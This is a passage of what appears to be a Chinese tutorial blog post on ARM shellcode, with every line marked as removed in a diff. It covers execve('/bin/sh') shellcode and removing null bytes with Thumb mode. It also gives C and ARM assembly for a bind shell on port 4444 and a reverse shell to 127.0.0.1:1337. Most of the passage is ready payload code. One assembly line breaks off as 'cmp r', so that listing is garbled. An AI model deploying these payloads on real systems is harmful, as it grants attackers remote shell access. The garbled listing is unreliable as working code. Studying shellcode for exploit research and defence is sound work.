class="line">   <span class="number">0x000264fc</span> &lt;+<span class="number">44</span>&gt;: <span class="keyword">bl</span> <span class="number">0x11520</span> &lt;__aeabi_read_tp&gt;</span><br><span class="line">   <span class="number">0x00026500</span> &lt;+<span class="number">48</span>&gt;: <span class="keyword">mvn</span> <span class="built_in">r3</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x00026504</span> &lt;+<span class="number">52</span>&gt;: <span class="keyword">str</span> <span class="built_in">r1</span>, [<span class="built_in">r0</span>, <span class="built_in">r2</span>]</span><br><span class="line">   <span class="number">0x00026508</span> &lt;+<span class="number">56</span>&gt;: <span class="keyword">b</span> <span class="number">0x264e8</span> &lt;execve+<span class="number">24</span>&gt;</span><br><span class="line">   <span class="number">0x0002650c</span> &lt;+<span class="number">60</span>&gt;: <span class="keyword">andeq</span> <span class="built_in">r0</span>, <span class="built_in">r7</span>, <span class="built_in">r0</span>, <span class="keyword">asr</span> <span class="number">#31</span></span><br></pre></td></tr></table></figure>
-
-<p>syscall为11</p>
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#12</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">        <span class="keyword">svc</span> <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/sh\0&quot;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">execve:</span>     file format elf32-littlearm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">Disassembly</span> of section <span class="meta">.text</span>:</span><br><span class="line"></span><br><span class="line"><span class="number">00010054</span> &lt;_start&gt;:</span><br><span class="line">   <span class="number">10054</span>: e28f000c <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#12</span></span><br><span class="line">   <span class="number">10058</span>: e3a01000 <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">1005</span>c: e3a02000 <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">10060</span>: e3a0700b <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">   <span class="number">10064</span>: ef000000 <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br><span class="line">   <span class="number">10068</span>: <span class="number">6</span>e69622f <span class="meta">.word</span> <span class="number">0x6e69622f</span></span><br><span class="line">   <span class="number">1006</span>c: <span class="number">0068732</span>f <span class="meta">.word</span> <span class="number">0x0068732f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>还是有很多NULL字符在里头的。</p>
-<h3 id="3-去除NULL字符数据"><a href="#3-去除NULL字符数据" class="headerlink" title="3. 去除NULL字符数据"></a>3. 去除NULL字符数据</h3><p>我们可以用来减少空字节出现在shell代码中的一种技术是使用拇指模式。使用拇指模式可以减少空字节的机会，因为拇指指令长2字节，而不是4字节。</p>
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">        <span class="meta">.code</span> <span class="number">32</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span></span><br><span class="line">        <span class="keyword">bx</span>  <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">.code</span> <span class="number">16</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#8</span></span><br><span class="line">        <span class="keyword">eor</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line">        <span class="keyword">eor</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">        <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r5</span>, <span class="built_in">r5</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/sh\0&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>去空后，效果还是不错的。</p>
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10054</span>: e28f3001  <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span></span><br><span class="line"><span class="number">10058</span>: e12fff13  <span class="keyword">bx</span> <span class="built_in">r3</span></span><br><span class="line"><span class="number">1005</span>c: a002       <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#8</span> <span class="comment">; (adr r0, 10068 &lt;_start+0x14&gt;)</span></span><br><span class="line"><span class="number">1005</span>e: <span class="number">4049</span>       <span class="keyword">eors</span> <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"><span class="number">10060</span>: <span class="number">4052</span>       <span class="keyword">eors</span> <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"><span class="number">10062</span>: <span class="number">270</span>b       <span class="keyword">movs</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line"><span class="number">10064</span>: df01       <span class="keyword">svc</span> <span class="number">1</span></span><br><span class="line"><span class="number">10066</span>: <span class="number">1</span>c2d       <span class="keyword">adds</span> <span class="built_in">r5</span>, <span class="built_in">r5</span>, <span class="number">#0</span></span><br><span class="line"><span class="number">10068</span>: <span class="number">6</span>e69622f  <span class="meta">.word</span> <span class="number">0x6e69622f</span></span><br><span class="line"><span class="number">1006</span>c: <span class="number">0068732</span>f  <span class="meta">.word</span> <span class="number">0x0068732f</span></span><br></pre></td></tr></table></figure>
-
-<p>提取shellcode：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objcopy -O binary execve3 execve3.bin </span><br></pre></td></tr></table></figure>
-
-<h2 id="bind-shell-to-tcp"><a href="#bind-shell-to-tcp" class="headerlink" title="bind shell to tcp"></a>bind shell to tcp</h2><p>过程：</p>
-<p>创建新的TCP套接字<br>绑定socket到本地端口<br>等待传入的连接<br>接受传入的连接<br>将STDIN STDOUT STDERR从客户端重定向到新创建的套接字<br>生成shell</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> host_sockid;    <span class="comment">// socket file descriptor </span></span><br><span class="line"><span class="keyword">int</span> client_sockid;  <span class="comment">// client file descriptor </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hostaddr</span>;</span>            <span class="comment">// server aka listen address</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">// Create new TCP socket </span></span><br><span class="line">    host_sockid = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize sockaddr struct to bind socket using it </span></span><br><span class="line">    hostaddr.sin_family = AF_INET;                  <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line">    hostaddr.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);                <span class="comment">// server port, converted to network byte order</span></span><br><span class="line">    hostaddr.sin_addr.s_addr = <span class="built_in">htonl</span>(INADDR_ANY);   <span class="comment">// listen to any address, converted to network byte order</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to IP/Port in sockaddr struct </span></span><br><span class="line">    <span class="built_in">bind</span>(host_sockid, (struct sockaddr*) &amp;hostaddr, <span class="built_in"><span class="keyword">sizeof</span></span>(hostaddr)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Listen for incoming connections </span></span><br><span class="line">    <span class="built_in">listen</span>(host_sockid, <span class="number">2</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Accept incoming connection </span></span><br><span class="line">    client_sockid = <span class="built_in">accept</span>(host_sockid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Duplicate file descriptors for STDIN, STDOUT and STDERR </span></span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">0</span>); </span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">1</span>); </span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">2</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute /bin/sh </span></span><br><span class="line">    <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="built_in">close</span>(host_sockid); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>Function</th>
-<th>R7</th>
-<th>R0</th>
-<th>R1</th>
-<th>R2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Socket</td>
-<td>281</td>
-<td>2</td>
-<td>1</td>
-<td>0</td>
-</tr>
-<tr>
-<td>Bind</td>
-<td>282</td>
-<td>host_sockid</td>
-<td>(struct sockaddr*) &amp;hostaddr</td>
-<td>16</td>
-</tr>
-<tr>
-<td>Listen</td>
-<td>284</td>
-<td>host_sockid</td>
-<td>2</td>
-<td>–</td>
-</tr>
-<tr>
-<td>Accept</td>
-<td>285</td>
-<td>host_sockid</td>
-<td>0</td>
-<td>0</td>
-</tr>
-<tr>
-<td>Dup2</td>
-<td>63</td>
-<td>client_sockid</td>
-<td>0 / 1 / 2</td>
-<td>–</td>
-</tr>
-<tr>
-<td>Execve</td>
-<td>11</td>
-<td>“/bin/sh”</td>
-<td>0</td>
-<td>0</td>
-</tr>
-</tbody></table>
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"><span class="symbol">    _start:</span></span><br><span class="line">    <span class="meta">.ARM</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>         <span class="comment">// switch to thumb mode </span></span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">.THUMB</span></span><br><span class="line"><span class="comment">// socket(2, 1, 0)</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">#2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#1</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>      <span class="comment">// set r2 to null</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#200</span>        <span class="comment">// r7 = 281 (socket)</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#81</span>         <span class="comment">// r7 value needs to be split </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>              <span class="comment">// r0 = host_sockid value</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">// save host_sockid in r4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bind(r0, &amp;sockaddr, 16)</span></span><br><span class="line">    <span class="keyword">adr</span>  <span class="built_in">r1</span>, struct_addr <span class="comment">// pointer to address, port</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#1</span>]    <span class="comment">// write 0 for AF_INET</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#4</span>]    <span class="comment">// replace 1 with 0 in x.1.1.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#5</span>]    <span class="comment">// replace 1 with 0 in 0.x.1.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#6</span>]    <span class="comment">// replace 1 with 0 in 0.0.x.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#7</span>]    <span class="comment">// replace 1 with 0 in 0.0.0.x</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#16</span>          <span class="comment">// struct address length</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#1</span>           <span class="comment">// r7 = 282 (bind) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// listen(sockfd, 0) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>           <span class="comment">// set r0 to saved host_sockid</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#2</span>        </span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#2</span>           <span class="comment">// r7 = 284 (listen syscall number) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>        </span><br><span class="line"></span><br><span class="line"><span class="comment">// accept(sockfd, NULL, NULL); </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>           <span class="comment">// set r0 to saved host_sockid</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>       <span class="comment">// set r1 to null</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>       <span class="comment">// set r2 to null</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#1</span>           <span class="comment">// r7 = 284+1 = 285 (accept syscall)</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>               <span class="comment">// r0 = client_sockid value</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>           <span class="comment">// save new client_sockid value to r4  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">cmp</span> r</span><br><span class="line"><span class="comment">// dup2(sockfd, 0) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#63</span>         <span class="comment">// r7 = 63 (dup2 syscall number) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid </span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>      <span class="comment">// r1 = 0 (stdin) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 1)</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid </span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 1 (stdout) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 2) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 2 (stderr) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0) </span></span><br><span class="line">    <span class="keyword">adr</span> <span class="built_in">r0</span>, shellcode   <span class="comment">// r0 = location of &quot;/bin/shX&quot;</span></span><br><span class="line">    <span class="keyword">eor</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>      <span class="comment">// clear register r1. R1 = 0</span></span><br><span class="line">    <span class="keyword">eor</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>      <span class="comment">// clear register r2. r2 = 0</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>, <span class="number">#7</span>]   <span class="comment">// store null-byte for AF_INET</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span>         <span class="comment">// execve syscall number</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">struct_addr:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x02\xff&quot;</span> <span class="comment">// AF_INET 0xff will be NULLed </span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x11\x5c&quot;</span> <span class="comment">// port number 4444 </span></span><br><span class="line"><span class="symbol">.byte</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span> <span class="comment">// IP Address </span></span><br><span class="line"><span class="symbol">shellcode:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/shX&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="reverse-shellcode"><a href="#reverse-shellcode" class="headerlink" title="reverse shellcode"></a>reverse shellcode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> sockfd; <span class="comment">// socket file descriptor</span></span><br><span class="line"> <span class="keyword">socklen_t</span> socklen; <span class="comment">// socket-length for new connections</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span> <span class="comment">// client address</span></span><br><span class="line"> </span><br><span class="line"> addr.sin_family = AF_INET; <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line"> addr.sin_port = <span class="built_in">htons</span>( <span class="number">1337</span> ); <span class="comment">// connect-back port, converted to network byte order</span></span><br><span class="line"> addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>); <span class="comment">// connect-back ip , converted to network byte order</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// create new TCP socket</span></span><br><span class="line"> sockfd = <span class="built_in">socket</span>( AF_INET, SOCK_STREAM, IPPROTO_IP );</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// connect socket</span></span><br><span class="line"> <span class="built_in">connect</span>(sockfd, (struct sockaddr *)&amp;addr, <span class="built_in"><span class="keyword">sizeof</span></span>(addr));</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//  Duplicate file descriptors for STDIN, STDOUT and STDERR</span></span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">1</span>);</span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// spawn shell</span></span><br><span class="line"> <span class="built_in">execve</span>( <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"> <span class="meta">.ARM</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>       <span class="comment">// switch to thumb mode </span></span><br><span class="line"> <span class="keyword">bx</span>    <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.THUMB</span></span><br><span class="line"><span class="comment">// socket(2, 1, 0) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="number">#2</span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#1</span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#200</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r7</span>, <span class="number">#81</span>         <span class="comment">// r7 = 281 (socket) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span>              <span class="comment">// r0 = resultant sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">// save sockfd in r4 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// connect(r0, &amp;sockaddr, 16) </span></span><br><span class="line"> <span class="keyword">adr</span>   <span class="built_in">r1</span>, struct        <span class="comment">// pointer to address, port </span></span><br><span class="line"> <span class="keyword">strb</span>  <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#1</span>]    <span class="comment">// write 0 for AF_INET </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r2</span>, <span class="number">#16</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r7</span>, <span class="number">#2</span>          <span class="comment">// r7 = 283 (connect) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 0) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#63</span>         <span class="comment">// r7 = 63 (dup2) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span 